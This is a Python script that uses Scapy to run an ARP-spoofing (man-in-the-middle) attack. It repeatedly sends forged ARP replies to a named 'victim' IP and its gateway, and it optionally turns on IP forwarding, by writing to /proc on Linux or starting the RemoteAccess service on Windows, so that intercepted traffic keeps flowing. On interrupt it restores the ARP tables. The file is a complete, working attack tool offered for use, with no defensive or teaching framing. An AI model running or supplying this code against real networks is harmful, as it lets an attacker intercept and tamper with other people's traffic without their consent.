import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, ARP, srp, sendp, conf
import argparse
import time
import sys
import os

conf.sniff_promisc = False

interval = 2

parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=200))
parser.add_argument("-t", "--target", help="Victim IP Address to ARP poison")
parser.add_argument("-g", "--gateway", help="Gateway IP Address")
parser.add_argument("-r", "--routing", action="store_true", help="Enable IP Routing")
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()

ip_target, ip_gateway, ip_routing = args.target, args.gateway, args.routing

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    ether = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether/arp
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    ether = Ether(dst=destination_mac)
    arp = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    packet = ether/arp
    sendp(packet, verbose=False, count=7)

packets_sent = 0
try:
    print(f"[!] Spoofing victim: {ip_target}")
    if ip_routing:
        print("[!] Enabling IP Routing...")
        if "nt" in os.name:
            from services import WService
            service = WService("RemoteAccess")
            service.start()
        else:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[!] IP Routing enabled.")
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        packets_sent += 2
        print(f"[+] Sent {packets_sent} packets.", end="\r")
        time.sleep(interval)
except KeyboardInterrupt:
    print(f"[+] Sent {packets_sent} packets.")
    if ip_routing:
        print("[!] Disabling IP Routing...")
        if "nt" in os.name:
            from services import WService
            service = WService("RemoteAccess")
            service.stop()
        else:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] IP Routing disabled.")
    print("[!] Restoring arp table...")
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
    print("[!] Arp table restored.")
    sys.exit()
